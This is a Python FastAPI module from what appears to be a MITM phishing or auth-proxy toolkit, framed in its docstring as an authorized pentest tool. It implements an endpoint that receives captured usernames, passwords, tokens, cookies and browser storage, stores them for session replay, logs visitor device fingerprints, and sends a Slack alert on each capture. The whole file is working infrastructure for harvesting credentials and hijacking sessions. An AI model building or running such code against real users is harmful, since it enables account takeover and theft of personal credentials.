"""External credential capture ingestion.

POST /api/capture/external accepts credentials/tokens/cookies from
pentester-side tooling that obtained them outside the MITM auth-proxy
path (e.g. a Burp extension, a separate runner, a manually-driven
session). The payload is written into the same `credentials` JsonStore
namespace and triggers the same Slack `capture` channel as in-band
captures from `routes/browser.py`, so the dashboard, encryption-at-rest,
and notification pipelines all work uniformly.

Authorization is gated by:
  - Bearer token (config `external_capture_token` or env
    `EXTERNAL_CAPTURE_TOKEN` or `config/external_capture_token.txt`).
    Empty token = endpoint disabled (404).
  - IP allowlist (`external_capture_allowed_ips`). Loopback is always
    allowed; remote callers must be on the configured list.

This is an authorized-pentest tool; the endpoint is intentionally
narrow (token + allowlist + no remote default) so it can't be turned
into an open phishing-kit relay.
"""

from __future__ import annotations

import hmac
import ipaddress
import os
import time
from typing import Any
from urllib.parse import urlparse

from fastapi import APIRouter, Body, HTTPException, Request, Response

from backend.keepalive import notify_slack_capture
from backend.routes.browser import (
    _fire_and_forget,
    _make_cred_key,
    cookies_store,
    credentials_store,
)
from backend.shared import (
    append_log,
    get_config_value,
    notify_sites_changed,
)


router = APIRouter()


def _configured_token() -> str:
    return (os.environ.get("EXTERNAL_CAPTURE_TOKEN", "")
            or get_config_value("external_capture_token", "") or "")


def _client_ip(request: Request) -> str:
    return (request.client.host if request.client else "") or ""


def _ip_allowed(ip: str) -> bool:
    if not ip:
        return False
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    if addr.is_loopback:
        return True
    raw = get_config_value("external_capture_allowed_ips", []) or []
    for entry in raw:
        try:
            if "/" in str(entry):
                if addr in ipaddress.ip_network(str(entry), strict=False):
                    return True
            elif addr == ipaddress.ip_address(str(entry)):
                return True
        except ValueError:
            continue
    return False


def _extract_token(request: Request) -> str:
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    return request.headers.get("x-capture-token", "").strip()


_CORS_BASE_HEADERS = {
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Authorization, X-Capture-Token, Content-Type",
    "Access-Control-Max-Age": "600",
}


def _cors_headers(request: Request) -> dict[str, str]:
    """Build the CORS response headers for this request, or {} if the
    Origin isn't allowed (same-origin requests have no Origin header and
    don't need CORS headers — return {}).

    Attached to BOTH the success response and any HTTPException raised
    along the way; otherwise the browser swallows an authentic 401/400
    as a generic CORS failure and debugging gets miserable.
    """
    origin = request.headers.get("origin", "").strip()
    if not origin:
        return {}
    allowed = get_config_value("external_capture_cors_origins", []) or []
    if "*" in allowed:
        # Authorization header isn't a CORS "credential" (cookies are), so
        # `*` is safe here even though the request is authenticated.
        return {"Access-Control-Allow-Origin": "*", **_CORS_BASE_HEADERS}
    if origin in allowed:
        return {
            "Access-Control-Allow-Origin": origin,
            "Vary": "Origin",
            **_CORS_BASE_HEADERS,
        }
    return {}


@router.options("/external")
async def external_capture_preflight(request: Request):
    """CORS preflight. Returns 204 with ACAO/headers when the request's
    Origin is on `external_capture_cors_origins`; 403 otherwise (same
    visible behaviour as an unallowed origin would get from the POST).
    """
    cors = _cors_headers(request)
    if not cors:
        raise HTTPException(status_code=403, detail="origin not allowed")
    return Response(status_code=204, headers=cors)


@router.post("/external")
async def external_capture(request: Request, response: Response,
                            body: dict = Body(...)):
    """Ingest a credential/token/cookie bundle from external tooling.

    Body fields (all optional except site_id):
      site_id           (str, required) — e.g. "microsoft", "github"
      user              (str) — user identity; rekeys the cred entry
      source_url        (str) — URL the creds were observed against
      username/password (str) — captured form inputs
      tokens            (list[str|dict]) — appended to existing tokens
      cookies           (list[dict]) — REPLACES existing cookies (mirrors
                                       _merge_manual_capture)
      local_storage     (dict)
      session_storage   (dict)
      captured_inputs   (dict) — extra form fields
      notes             (str)
    """
    cors = _cors_headers(request)
    expected = _configured_token()
    if not expected:
        # Endpoint is opt-in. Don't leak its existence.
        raise HTTPException(status_code=404, detail="Not Found", headers=cors)

    client_ip = _client_ip(request)

    # Capture all request headers for audit trail
    all_headers = dict(request.headers)
    user_agent = all_headers.get("user-agent", "unknown")[:80]
    origin = all_headers.get("origin", "same-origin")

    if not _ip_allowed(client_ip):
        append_log("warn", "capture",
                   f"[REJECTED] IP_BLOCKED — ip={client_ip} | ua={user_agent} | origin={origin} | headers={len(all_headers)}")
        raise HTTPException(status_code=403, detail="forbidden", headers=cors)

    presented = _extract_token(request)
    if not presented or not hmac.compare_digest(presented, expected):
        append_log("warn", "capture",
                   f"[REJECTED] TOKEN_INVALID — ip={client_ip} | ua={user_agent} | origin={origin} | headers={len(all_headers)}")
        raise HTTPException(status_code=401, detail="unauthorized", headers=cors)

    site_id = str(body.get("site_id") or "").strip()
    if not site_id:
        raise HTTPException(status_code=400, detail="site_id required", headers=cors)

    user = str(body.get("user") or body.get("username") or "").strip()
    source_url = str(body.get("source_url") or "").strip()
    # Correlation id — silent.html mints one and sends it here so a
    # follow-on :8091 session started with ?cid= can find this exact
    # capture and replay the visitor's device (see browser.py CID_LINK).
    cid = str(body.get("cid") or "").strip()
    new_tokens = body.get("tokens") or []
    new_cookies = body.get("cookies") or []
    local_storage = body.get("local_storage") or {}
    session_storage = body.get("session_storage") or {}
    captured_inputs = dict(body.get("captured_inputs") or {})
    notes = str(body.get("notes") or "").strip()

    # Form-style inputs land in captured_inputs so the dashboard's
    # existing "Captured Data" card surfaces them next to in-band ones.
    if body.get("username"):
        captured_inputs.setdefault("username", body["username"])
    if body.get("password"):
        captured_inputs.setdefault("password", body["password"])

    if not isinstance(new_tokens, list):
        raise HTTPException(status_code=400, detail="tokens must be list", headers=cors)
    if not isinstance(new_cookies, list):
        raise HTTPException(status_code=400, detail="cookies must be list", headers=cors)

    ck = _make_cred_key(site_id, user)
    now = time.time()

    # Capture all request headers for storage
    request_headers_dict = dict(request.headers)

    def _merge(cred_data: dict[str, Any]) -> dict[str, Any]:
        existing = cred_data.get("tokens") or []
        cred_data["tokens"] = existing + [
            {"value": t, "source": "external", "captured_at": now}
            if isinstance(t, str) else {**t, "source": t.get("source", "external")}
            for t in new_tokens
        ]
        if new_cookies:
            cred_data["cookies"] = new_cookies
        if local_storage:
            cred_data["local_storage"] = local_storage
        if session_storage:
            cred_data["session_storage"] = session_storage
        if source_url:
            cred_data["current_url"] = source_url
        if captured_inputs:
            # Build captured_inputs as an array (like in-band captures) for dashboard display,
            # while preserving detailed metadata in a separate field
            existing_list = cred_data.get("captured_inputs") or []
            if not isinstance(existing_list, list):
                existing_list = []

            # Extract username/password for the display array
            username = captured_inputs.get("username") or captured_inputs.get("user") or ""
            password = captured_inputs.get("password") or ""
            if username and password:
                existing_list.append(f"{username}:{password}")

            cred_data["captured_inputs"] = existing_list
            # Store detailed metadata separately for advanced inspection
            cred_data["external_capture_metadata"] = {
                k: v for k, v in captured_inputs.items()
                if k not in ("username", "password", "user")
            }
        if notes:
            cred_data["notes"] = notes
        cred_data["captured_at"] = now
        cred_data["user_id"] = user
        cred_data["site_id"] = site_id
        cred_data["capture_source"] = "external"
        if cid:
            cred_data["cid"] = cid
        # Store all request headers for audit trail
        cred_data["request_headers"] = request_headers_dict
        return cred_data

    cred_data = await credentials_store.update(
        ck, _merge, default={"tokens": [], "cookies": []})

    # Mirror in-band capture: keep cookies_store in sync so existing
    # session-replay code paths find them.
    if new_cookies:
        cookies_store.put(ck, new_cookies)

    notify_sites_changed()

    hostname = (urlparse(source_url).hostname if source_url else "") or site_id
    total_tokens = len(cred_data.get("tokens", []))
    total_cookies = len(cred_data.get("cookies", []))

    # Extract fingerprint information from stored credentials
    # _merge moves fingerprint data to external_capture_metadata, so get it from there
    fingerprint_info = cred_data.get("external_capture_metadata", {})

    _fire_and_forget(notify_slack_capture(
        ck, hostname, total_tokens, total_cookies, user=user,
        fingerprint=fingerprint_info))

    # Capture all request headers for audit trail and store in credentials
    all_request_headers = dict(request.headers)

    fingerprint_id = fingerprint_info.get("fingerprint_id", "none")[:16]
    fingerprint_confidence = fingerprint_info.get("fingerprint_confidence", 0)
    screen_res = ""
    if "screen" in fingerprint_info:
        screen_data = fingerprint_info["screen"]
        if isinstance(screen_data, dict):
            screen_res = f"{screen_data.get('w')}x{screen_data.get('h')}"
    timezone = fingerprint_info.get("timezone", "unknown")

    append_log(
        "info", "capture",
        f"[OK] site={site_id} user={user or '-'} tokens+={len(new_tokens)} "
        f"cookies+={len(new_cookies)} from {client_ip} | "
        f"ua={all_request_headers.get('user-agent', 'unknown')[:60]} | "
        f"origin={all_request_headers.get('origin', 'same-origin')} | "
        f"fp_id={fingerprint_id} | fp_conf={fingerprint_confidence:.2f} | "
        f"screen={screen_res} | tz={timezone} | headers={len(all_request_headers)}")

    for k, v in cors.items():
        response.headers[k] = v

    return {
        "status": "captured",
        "cred_key": ck,
        "tokens": total_tokens,
        "cookies": total_cookies,
    }
